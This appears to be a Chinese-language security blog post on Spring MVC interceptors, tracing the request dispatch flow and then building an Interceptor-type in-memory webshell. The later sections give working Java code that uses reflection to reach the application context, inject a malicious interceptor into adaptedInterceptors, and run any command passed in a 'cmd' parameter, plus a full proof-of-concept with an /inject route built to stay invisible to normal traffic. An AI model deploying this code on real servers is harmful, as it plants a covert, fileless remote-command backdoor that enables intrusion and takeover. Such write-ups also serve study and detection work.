---
title: Interceptor型内存马
date: 2026-06-25 08:07:34
updated: 2026-06-29 07:57:49
tags:
  - Web
  - 内存马
  - Spring内存马
---
# 什么是Interceptor

Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。

在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。

-   实现`HandlerInterceptor`接口或者继承`HandlerInterceptor`接口的实现类（例如 HandlerInterceptorAdapter）；
-   实现`WebRequestInterceptor`接口或者继承`WebRequestInterceptor`接口的实现类

我们先配置一个简单的`Interceptor`，这里我们通过第一种方式来定义`Interceptor`。  
先看看`HandlerInterceptor`类代码：  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782705544697-e6242cd1-078a-419f-969f-28bd29f14a63.png)

**可以看到**`**HandlerInterceptor**`**类一共有三个方法，作用分别为：**

-   `**preHandle()**`**：在 Controller 处理请求之前执行，返回**`**true**`**为放行，执行下一个拦截器，如果没有拦截器就执行 Controller 方法；返回**`**false**`**为不放行，不会执行 Controller 方法。**
-   `**postHandle()**`**：在 Controller 处理请求之后、解析视图（例如 JSP）之前执行，如果拦截器定义了跳转的页面，则不会跳转 Controller 方法指定的页面。**
-   `**afterCompletion()**`**：在 Controller 处理请求之后、解析视图之后执行，该方法可以完成一些处理日志**

# Interceptor流程分析

## 传统Spring MVC拦截器配置

```java
package com.shell.interceptor;

import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;

public class Spring_Interceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String url = request.getRequestURI();
        PrintWriter writer = response.getWriter();
        //如果请求路径为/login则放行
        if ( url.indexOf("/login") >= 0){
            writer.write("LoginIn");
            writer.flush();
            writer.close();
            return true;
        }
        writer.write("LoginInFirst");
        writer.flush();
        writer.close();
        return false;
    }
}
```

在springmvc.xml配置文件中配置相应的Interceptor

```xml
...
<mvc:interceptors>
  <mvc:interceptor>
    <mvc:mapping path="/*"/>
    <bean class="com.shell.interceptor.Spring_Interceptor"/>
  </mvc:interceptor>
</mvc:interceptors>
...
```

编写对应的Controller

```java
package com.shell.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class Spring_Controller {

    @ResponseBody
    @RequestMapping("/login")
    public String Login(){
        return "Success!";
    }
}
```

访问对应路径

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782374373119-e64dc869-5038-4736-a071-3b0bb3b1fbca.png)

  

## Springboot拦截器配置

创建拦截器

```java
package com.study.springdemo.Interceptor;

import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class SpringInterceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception{
        System.out.println("SpringInterceptor init...");
        String url = request.getRequestURI();
        if (url.indexOf("/login") >=0){
            response.getWriter().write("Login page");
            response.getWriter().flush();
            response.getWriter().close();
            return true;
        }
        response.getWriter().write("Please login first");
        response.getWriter().flush();
        response.getWriter().close();
        return false;
    }
}
```

创建配置类

```java
package com.study.springdemo.Config;

import com.study.springdemo.Interceptor.SpringInterceptor;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class InterceptorConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        //addPathPatterns用于添加拦截路径
        //excludePathPatterns用于添加不拦截的路径
        registry.addInterceptor(new SpringInterceptor()).addPathPatterns("/*").excludePathPatterns("");
    }
}
```

创建控制器

```java
package com.study.springdemo.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class LoginController{
    @ResponseBody
    @RequestMapping("/login")
    public String Login(){
        return "Success";
    }

}
```

访问`/login`  
![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782711584754-4486838b-5ecd-4b86-9611-6c80f4f65093.png)

访问`/test123`  
![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782711597383-5007182f-f639-4b17-b30f-2d1e122b489c.png)

可以看到请求流程都按拦截器所设定的运行，代表拦截器配置成功。

接下来打上断点跟一下`Interceptor`的请求流程  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782705545013-9d2c7e5f-bdb4-42d1-ad50-6543022dea84.png)

看看此时的调用栈  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782705545101-35551a34-9211-4d72-9562-1ff0091b617d.png)

是不是有点熟悉？是的，调用流程和 Filter 差不多，但不同的是最后处理交给了`DispatcherServlet#doDispatch()`，那么我们就从这里开始跟起  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782705545180-941e9a24-18d2-4a14-af7d-974561c0fd54.png)

在`doDispatch()`方法中调用了`getHandler()`方法，我们跟进看看  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782705545250-05a5fff9-a0d1-4290-981b-b1e21364d165.png)

可以看到这里遍历了`this.handlerMappings`迭代器获取`HandlerMapping`对象实例`mapping`，然后对每个`mapping`分别调用`getHandler()`方法，继续跟进`getHandler()`方法  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782705545322-0aa10c96-5350-4b70-b3a8-3274e48e23b3.png)

接着又调用到了`getHandlerExecutionChain()`方法  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782705545421-3c515cf0-b49b-41b7-bf2e-b4ffabe47f9b.png)

可以看到通过`this.adaptedInterceptors`迭代器获取了所有`Interceptor`，其中包含我们自定义的`SpringInterceptor`拦截器，在最后通过`chain.addInterceptor()`方法将`Interceptor`添加到`HandlerExecutionChain`对象实例`chain`中，并 return 返回。

`getHandler()`方法的流程走完后，回到一开始的`doDispatch()`方法  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782705545523-38a6d69f-1682-4eba-b7fa-1a956ce0264a.png)

可以看到此时的`mappedHandler`元素`handler`是我们编写的控制器的`Login()`方法，接着往下走调用了`applyPreHandle()`方法，继续跟进  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782705545650-876857bc-3008-414e-9ba3-1ff2c9fd53cd.png)

可以看到最后遍历调用`Interceptor`的`preHandle()`拦截方法，根据前面的调用链，我们可以简单总结一次请求到应用层的步骤为：

```plain
HttpRequest --> Filter --> DispactherServlet --> Interceptor --> Controller
```

# Interceptor型内存马实现思路

通过以上分析，Interceptor实际上是可以拦截所有想到达Controller的请求的。下面的问题就是如何动态地注册一个恶意的Interceptor了。由于Interceptor和Filter有一定的相似之处，因此我们可以仿照Filter型内存马的实现思路

-   获取当前运行环境的上下文
-   实现恶意Interceptor
-   注入恶意Interceptor

# 获取环境上下文

在Controller型内存马中，给出了四种获取Spring上下文`ApplicationContext`的方法。下面我们还可以通过反射获取`LiveBeansView`类的`applicationContexts` 属性来获取上下文。

```java
// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
// 2. 属性被 private 修饰，所以 setAccessible true
filed.setAccessible(true);
// 3. 获取一个 ApplicationContext 实例
org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();
```

`org.springframework.context.support.LiveBeansView` 类在 `spring-context` **3.2.x** 版本（现在最新版本是 **5.3.x**）才加入其中，所以比较低版本的 spring 无法通过此方法获得 `ApplicationContext` 的实例。

# 获取adaptedInterceptors属性值

获得 `ApplicationContext` 实例后，还需要知道 `org.springframework.web.servlet.handler.AbstractHandlerMapping` 类实例的 bean name 叫什么。

在前面的`Controller`内存马注入的时候，我们分析过是`RequestMappingHandlerMapping`，这里贴上一个小笔记

> Spring 2.5 开始到 Spring 3.1 之前一般使用 `org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping` 映射器 ；
> 
> Spring 3.1 开始及以后一般开始使用新的 `org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping` 映射器来支持`@Contoller`和`@RequestMapping`注解。
> 
> 当然，也有高版本依旧使用旧映射器的情况。因此正常程序的上下文中一般存在其中一种映射器的实例 `bean`。又因版本不同和较多的接口等原因，手工注册动态 `controller` 的方法不止一种。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782374373938-65e2a875-46a6-4b1b-871d-bc310204f5a4.png)

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782374374051-fd652dc5-8e67-42bd-af7e-f51a8f467c2c.png)

我们可以通过`ApplicationContext`上下文来获取`AbstractHandlerMapping`，进而反射获取`adaptedInterceptors`属性值

```java
org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
field.setAccessible(true);
java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
```

# 实现恶意Interceptor

这里选择继承HandlerInterceptor类，并重写其preHandle方法

```java
package com.shell.interceptor;

import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class EvilInterceptor implements HandlerInterceptor{
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            try{
                String cmd = request.getParameter("cmd");
                if(cmd != null){
                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                    ByteArrayOutputStream bao = new ByteArrayOutputStream();
                    byte[] bytes = new byte[1024];
                    int a = -1;
                    while((a = inputStream.read(bytes))!=-1){
                        bao.write(bytes,0,a);
                    }
                    response.getWriter().write(new String(bao.toByteArray()));
                }else {
                    response.sendError(404);
                }
                return true;
            }catch (Exception e){
                e.printStackTrace();
            }
            return false;
        }
    }
}
```

# 动态注册Interceptor

我们知道Spring是通过遍历adaptedInterceptors属性值来执行Interceptor的，因此最后我们只需要将恶意Interceptor加入到 `adaptedInterceptors` 属性值中就可以了。

```java
//将恶意Interceptor添加入adaptedInterceptors
EvilInterceptor evil_interceptor = new EvilInterceptor();
adaptedInterceptors.add(evil_interceptor);
```

# 完整POC

```java
package org.example.springdemo.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.HandlerInterceptor;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;

@Controller
public class EvilInterceptor {
    @ResponseBody
    @RequestMapping("/inject")
    public void Inject() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Field applicationContextsFiled = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
        applicationContextsFiled.setAccessible(true);
        org.springframework.web.context.WebApplicationContext context = (org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)applicationContextsFiled.get(null)).iterator().next();

        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);

        Evil evil = new Evil();
        adaptedInterceptors.add(evil);
        System.out.println("inject success!");
    }
    public class Evil implements HandlerInterceptor{
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            try {
                String cmd = request.getParameter("cmd");
                if (cmd != null) {
                    // 执行命令并写入响应
                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                    ByteArrayOutputStream bao = new ByteArrayOutputStream();
                    byte[] bytes = new byte[1024];
                    int len;
                    while ((len = inputStream.read(bytes)) != -1) {
                        bao.write(bytes, 0, len);
                    }
                    response.getWriter().write(new String(bao.toByteArray()));
                    // 执行命令后终止后续流程，避免业务内容污染命令结果
                    return false;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            // 无cmd参数时直接放行，不修改响应，不影响正常业务
            return true;
        }
    }
}

```

访问对应路由`/inject`

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782719703007-f195dcc9-25c2-40f7-a0e6-32d6bd752743.png)

成功执行

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782719863922-6b0ecf4d-8ba5-4b9f-b804-e9f987d35f10.png)

无cmd执行时直接放行，不修改响应，不影响正常业务

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782719745426-0a52acd8-9b73-4172-8e83-5b7bd474433b.png)